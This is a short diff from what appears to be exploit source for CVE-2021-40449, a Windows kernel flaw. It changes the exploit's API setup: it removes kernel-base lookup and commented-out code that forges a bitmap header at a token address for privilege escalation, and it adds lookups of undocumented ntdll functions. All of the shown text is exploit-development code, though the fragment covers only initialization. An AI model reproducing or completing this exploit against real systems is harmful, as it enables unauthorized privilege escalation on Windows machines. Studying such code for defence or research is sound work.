@@ -4,25 +4,14 @@ namespace CVE_2021_40449
 {
 
     bool initAPI() {
-
-        auto kernelBase = exploit::memtools::ulGetKernelBase((PCHAR)"ntoskrnl.exe");
-
-        kernelModule = LoadLibraryExW(L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
-        if (kernelModule == NULL) {
+        ntdllModule = LoadLibraryExW(L"ntdll.dll", NULL, DONT_RESOLVE_DLL_REFERENCES);
+        if (ntdllModule == NULL) {
             puts("[-] Failed to load kernel module");
             return false;
         }
-        // auto rtlSetAllBitsOffset = (DWORD64)GetProcAddress(kernelModule, "RtlSetAllBits");
-        // if (rtlSetAllBitsOffset == NULL) {
-        //     puts("[-] Failed to find RtlSetAllBits");
-        //     return false;
-        // }
-        // rtlSetAllBits = (DWORD64)kernelBase + rtlSetAllBitsOffset - (DWORD64)kernelModule;
-        // fakeRtlBitMapAddr = exploit::memtools::CreateForgedBitMapHeader(tokenKernelAddress + 0x40);
-        // if (fakeRtlBitMapAddr == NULL) {
-        //     puts("[-] Failed to pool leak address of token");
-        //     return FALSE;
-        // }
+        SetInformationThread = (NtSetInformationThread_t)GetProcAddress(ntdllModule, "NtSetInformationThread");
+        QuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(ntdllModule, "NtQuerySystemInformation");
+
         return true;
     }
 
